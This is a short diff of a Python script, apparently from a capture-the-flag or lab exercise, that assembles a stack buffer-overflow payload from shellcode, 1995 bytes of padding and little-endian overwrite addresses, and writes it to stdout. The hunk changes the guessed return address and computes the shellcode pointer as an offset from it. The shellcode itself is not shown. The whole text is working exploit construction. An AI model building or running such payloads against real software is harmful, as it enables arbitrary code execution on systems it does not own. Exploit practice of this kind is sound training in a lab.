@@ -23,10 +23,10 @@ import sys
 
 # ATTEMPT 1
 #0xfff6cc68
-padding = b'A' * 1995
-a_address = 0xFFF6A0B4  # Replace maybeeeeee
+padding = b'A'*1995
+a_address = 0xfff6c458 #0xfff6cbdc  # Replace maybeeeeee
 
-shells = 0xfff6a0bc
+shells = a_address + 0x814
 
 exploit = shellcode + padding + a_address.to_bytes(4, 'little') + shells.to_bytes(4, 'little')
 sys.stdout.buffer.write(exploit)
